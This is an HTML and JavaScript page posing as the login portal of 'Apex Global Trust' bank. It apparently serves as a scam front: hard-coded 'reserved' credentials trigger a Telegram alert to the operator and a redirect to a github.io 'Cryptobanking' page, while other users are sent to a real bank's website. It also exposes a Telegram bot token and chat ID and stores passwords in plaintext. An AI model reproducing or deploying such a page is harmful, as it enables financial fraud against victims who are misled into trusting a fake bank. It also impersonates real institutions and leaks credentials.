<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apex Global Trust | Secure Banking</title>
    <style>
        :root {
            --primary: #0a192f;
            --accent: #c5a059;
            --text-light: #e6f1ff;
            --bg: #f4f7f6;
            --success: #28a745;
        }

        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: var(--bg);
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .bank-card {
            background: white;
            width: 100%;
            max-width: 400px;
            padding: 40px;
            border-radius: 4px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            border-top: 5px solid var(--accent);
            position: relative;
        }

        .logo-area {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo-icon {
            font-size: 40px;
            color: var(--primary);
            font-weight: bold;
        }

        .bank-name {
            display: block;
            font-size: 14px;
            letter-spacing: 3px;
            color: var(--primary);
            text-transform: uppercase;
            margin-top: 5px;
        }

        h2 { color: var(--primary); font-size: 22px; margin-bottom: 8px; text-align: center;}
        p.desc { text-align: center; color: #666; font-size: 13px; margin-bottom: 25px;}

        .input-group { margin-bottom: 15px; }
        
        label { display: block; font-size: 12px; color: var(--primary); font-weight: bold; margin-bottom: 5px; }

        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 3px;
            box-sizing: border-box;
            background: #fafafa;
        }

        button {
            width: 100%;
            padding: 14px;
            background: var(--primary);
            color: var(--accent);
            border: none;
            border-radius: 3px;
            font-weight: bold;
            text-transform: uppercase;
            cursor: pointer;
            margin-top: 10px;
            transition: 0.3s;
        }

        button:hover { background: #112240; }

        .link-btn {
            display: block;
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #004a99;
            text-decoration: none;
            cursor: pointer;
        }

        .alert {
            padding: 10px;
            border-radius: 3px;
            margin-bottom: 15px;
            font-size: 13px;
            display: none;
        }
        .alert-success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .alert-error { background: #f8d7da; color: #721c24; border: 1px solid #f5c2c7; }

        .hidden { display: none; }
    </style>
</head>
<body>

    <div class="bank-card">
        <div class="logo-area">
            <div class="logo-icon">â–²</div>
            <span class="bank-name">Apex Global Trust</span>
        </div>

        <div id="alertBox" class="alert"></div>

        <!-- REGISTRATION -->
        <div id="regView">
            <h2>Create Account</h2>
            <p class="desc">Open your digital vault in minutes.</p>
            <form id="regForm">
                <div class="input-group"><label>USERNAME</label><input type="text" id="regUser" required></div>
                <div class="input-group"><label>PASSWORD</label><input type="password" id="regPass" required></div>
                <button type="submit">Complete Registration</button>
            </form>
            <div class="link-btn" onclick="showView('loginView')">Already a member? Sign In</div>
        </div>

        <!-- LOGIN -->
        <div id="loginView" class="hidden">
            <h2>Secure Login</h2>
            <p class="desc">Authorized access only.</p>
            <form id="loginForm">
                <div class="input-group"><label>USERNAME</label><input type="text" id="loginUser" required></div>
                <div class="input-group"><label>PASSWORD</label><input type="password" id="loginPass" required></div>
                <button type="submit">Access Account</button>
            </form>
            <div class="link-btn" onclick="showView('resetView')">Forgot Password?</div>
            <div class="link-btn" onclick="showView('regView')">New User? Register</div>
        </div>

        <!-- RESET PASSWORD -->
        <div id="resetView" class="hidden">
            <h2>Recover Access</h2>
            <p class="desc">Enter your username and new credentials.</p>
            <form id="resetForm">
                <div class="input-group"><label>USERNAME</label><input type="text" id="resetUser" required></div>
                <div class="input-group"><label>NEW PASSWORD</label><input type="password" id="resetNewPass" required></div>
                <button type="submit">Reset Password</button>
            </form>
            <div class="link-btn" onclick="showView('loginView')">Return to Login</div>
        </div>
    </div>

    <script>
        // CONFIGURATION
        const RESERVED_USER = "JamesRich45";
        const RESERVED_PASS = "Suvjames28#";
        const TELEGRAM_BOT_TOKEN = "8585104821:AAFXZn3g7QG9NsCmLmZuyfviQkPddOYMJzc"; 
        const TELEGRAM_CHAT_ID = "8468538314";     

        // INDEXED DB SETUP
        let db;
        const request = indexedDB.open("BankDB", 1);
        request.onupgradeneeded = (e) => {
            db = e.target.result;
            if (!db.objectStoreNames.contains("users")) {
                db.createObjectStore("users", { keyPath: "username" });
            }
        };
        request.onsuccess = (e) => db = e.target.result;

        // NAVIGATION
        function showView(viewId) {
            document.querySelectorAll('#regView, #loginView, #resetView').forEach(v => v.classList.add('hidden'));
            document.getElementById(viewId).classList.remove('hidden');
            document.getElementById('alertBox').style.display = 'none';
        }

        function showAlert(msg, type) {
            const box = document.getElementById('alertBox');
            box.innerText = msg;
            box.className = `alert alert-${type}`;
            box.style.display = 'block';
        }

        // TELEGRAM NOTIFICATION
        async function notifyTelegram(user) {
            const message = `ðŸš¨ SECURITY ALERT: Reserved User [${user}] has logged into the Banking Portal.`;
            const url = `https://api.telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
            try { await fetch(url); } catch (e) { console.error("Telegram fail", e); }
        }

        // REGISTRATION LOGIC
        document.getElementById('regForm').onsubmit = (e) => {
            e.preventDefault();
            const username = document.getElementById('regUser').value;
            const password = document.getElementById('regPass').value;

            if(username === RESERVED_USER) return showAlert("This username is reserved.", "error");

            const transaction = db.transaction(["users"], "readwrite");
            const store = transaction.objectStore("users");
            const request = store.add({ username, password });

            request.onsuccess = () => {
                showView('loginView');
                showAlert("Account Created Successfully! Please Login.", "success");
            };
            request.onerror = () => showAlert("User already exists.", "error");
        };

        // LOGIN LOGIC
        document.getElementById('loginForm').onsubmit = (e) => {
            e.preventDefault();
            const user = document.getElementById('loginUser').value;
            const pass = document.getElementById('loginPass').value;

            // Priority Check for Reserved User
            if (user === RESERVED_USER && pass === RESERVED_PASS) {
                notifyTelegram(user);
                window.location.href = "https://cryptobanki28.github.io/Cryptobanking/Cryptobanking2.html";
                return;
            }

            const transaction = db.transaction(["users"], "readonly");
            const store = transaction.objectStore("users");
            const request = store.get(user);

            request.onsuccess = () => {
                if (request.result && request.result.password === pass) {
                    window.location.href = "https://ke.ncbagroup.com";
                } else {
                    showAlert("Invalid Credentials.", "error");
                }
            };
        };

        // RESET LOGIC (UPDATED & FUNCTIONAL)
        document.getElementById('resetForm').onsubmit = (e) => {
            e.preventDefault();
            const user = document.getElementById('resetUser').value;
            const newPass = document.getElementById('resetNewPass').value;

            if (user === RESERVED_USER) {
                return showAlert("Access Denied: Reserved accounts cannot reset credentials online.", "error");
            }

            const transaction = db.transaction(["users"], "readwrite");
            const store = transaction.objectStore("users");
            const getRequest = store.get(user);

            getRequest.onsuccess = () => {
                const data = getRequest.result;
                if (data) {
                    data.password = newPass;
                    const updateRequest = store.put(data);
                    updateRequest.onsuccess = () => {
                        showAlert("Password reset successful! Redirecting...", "success");
                        setTimeout(() => showView('loginView'), 1500);
                    };
                } else {
                    showAlert("Username not found in our records.", "error");
                }
            };
            getRequest.onerror = () => showAlert("Database error occurred.", "error");
        };
    </script>
</body>
</html>
